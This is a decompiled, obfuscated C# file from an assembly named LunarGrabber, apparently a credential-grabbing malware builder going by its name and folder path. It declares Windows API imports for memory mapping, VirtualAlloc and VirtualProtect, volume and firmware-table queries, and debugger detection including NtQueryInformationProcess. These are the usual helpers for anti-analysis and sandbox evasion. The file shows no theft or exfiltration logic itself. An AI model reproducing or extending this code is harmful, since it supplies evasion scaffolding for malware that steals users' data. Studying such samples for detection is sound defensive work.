﻿// Decompiled with JetBrains decompiler
// Type: 00B656A0
// Assembly: LunarGrabber, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F156DE2-B4D0-4210-84CA-FF98CDA75F13
// Assembly location: C:\Users\jayde\OneDrive\Desktop\CT-Dev.MT\ZeroStance\Grabbers (Builders)\LunarGrabber_v2\LunarGrabber.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

internal static class \u00300B656A0
{
  public const int \u00340C90079 = -2147483648;
  public const int \u00368BE55A6 = 3;
  public const int \u0030AB9714B = 128;
  public const int \u00300A64C11 = 1;
  public const int \u00375482F6A = 2;
  public static readonly IntPtr \u0031720375E = new IntPtr(-1);
  public static readonly IntPtr \u00343743FF2 = IntPtr.Zero;
  public static readonly IntPtr \u00372A902A1 = new IntPtr(-1);

  [DllImport("kernel32", EntryPoint = "CreateFile", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr \u0031B063D15(
    string _param0,
    int _param1,
    int _param2,
    IntPtr _param3,
    int _param4,
    int _param5,
    IntPtr _param6);

  [DllImport("kernel32", EntryPoint = "CreateFileMapping", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr \u003041476C8(
    IntPtr _param0,
    IntPtr _param1,
    \u00300B656A0.\u00317F43E2F _param2,
    int _param3,
    int _param4,
    string _param5);

  [DllImport("kernel32", EntryPoint = "FlushViewOfFile", SetLastError = true)]
  public static extern bool \u0031A0506EE(IntPtr _param0, int _param1);

  [DllImport("kernel32", EntryPoint = "MapViewOfFile", SetLastError = true)]
  public static extern IntPtr \u0032242384D(
    IntPtr _param0,
    \u00300B656A0.\u00315CA7636 _param1,
    int _param2,
    int _param3,
    IntPtr _param4);

  [DllImport("kernel32", EntryPoint = "OpenFileMapping", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr \u00353876975(int _param0, bool _param1, string _param2);

  [DllImport("kernel32", EntryPoint = "UnmapViewOfFile", SetLastError = true)]
  public static extern bool \u00331C937A5(IntPtr _param0);

  [DllImport("kernel32", EntryPoint = "CloseHandle", SetLastError = true)]
  public static extern bool \u00351FA65ED(IntPtr _param0);

  [DllImport("kernel32", EntryPoint = "GetFileSize", SetLastError = true)]
  public static extern uint \u0030D2F0A4D(IntPtr _param0, IntPtr _param1);

  [DllImport("kernel32", EntryPoint = "VirtualAlloc", SetLastError = true)]
  public static extern IntPtr \u00325B518E3(
    IntPtr _param0,
    UIntPtr _param1,
    \u00300B656A0.\u00371F82615 _param2,
    \u00300B656A0.\u00317F43E2F _param3);

  [DllImport("kernel32", EntryPoint = "VirtualFree", SetLastError = true)]
  public static extern bool \u003361A6560(IntPtr _param0, uint _param1, uint _param2);

  [DllImport("kernel32", EntryPoint = "VirtualProtect", SetLastError = true)]
  public static extern bool \u00341393563(
    IntPtr _param0,
    UIntPtr _param1,
    \u00300B656A0.\u00317F43E2F _param2,
    out \u00300B656A0.\u00317F43E2F _param3);

  [DllImport("kernel32", EntryPoint = "GetVolumeInformation", SetLastError = true)]
  public static extern bool \u00333B91268(
    string _param0,
    StringBuilder _param1,
    uint _param2,
    ref uint _param3,
    ref uint _param4,
    ref uint _param5,
    StringBuilder _param6,
    uint _param7);

  [DllImport("kernel32", EntryPoint = "IsDebuggerPresent")]
  public static extern bool \u0036AB6406B();

  [DllImport("kernel32", EntryPoint = "CheckRemoteDebuggerPresent")]
  public static extern bool \u00330602674();

  [DllImport("kernel32", EntryPoint = "EnumSystemFirmwareTables", SetLastError = true)]
  public static extern uint \u00366D120A0(uint _param0, IntPtr _param1, uint _param2);

  [DllImport("kernel32", EntryPoint = "GetSystemFirmwareTable", SetLastError = true)]
  public static extern uint \u0031A722F6B(
    uint _param0,
    uint _param1,
    IntPtr _param2,
    uint _param3);

  [DllImport("ntdll", EntryPoint = "NtQueryInformationProcess")]
  public static extern int \u00340A45640(
    IntPtr _param0,
    int _param1,
    IntPtr _param2,
    uint _param3,
    out uint _param4);

  [Flags]
  public enum \u00371F82615 : uint
  {
    \u003078A7C44 = 4096, // 0x00001000
    \u0032AD57E14 = 8192, // 0x00002000
  }

  [Flags]
  public enum \u00317F43E2F : uint
  {
    \u00351B345F1 = 1,
    \u00319D87F6B = 2,
    \u003114D2085 = 4,
    \u0033E337556 = 8,
    \u00308DA2737 = 16, // 0x00000010
    \u00376562B85 = 32, // 0x00000020
    \u00300C34D58 = 64, // 0x00000040
    \u003429A51FD = 256, // 0x00000100
  }

  [Flags]
  public enum \u00315CA7636 : uint
  {
    \u003184A674C = 1,
    \u0031FA654AE = 2,
    \u00370C02AB5 = 4,
    \u0035344137E = 31, // 0x0000001F
  }

  [Flags]
  public enum \u0032D8B75E7 : uint
  {
    \u0031DF0689D = 536870912, // 0x20000000
    \u0034DA77A87 = 1073741824, // 0x40000000
    \u0031E613815 = 2147483648, // 0x80000000
  }
}
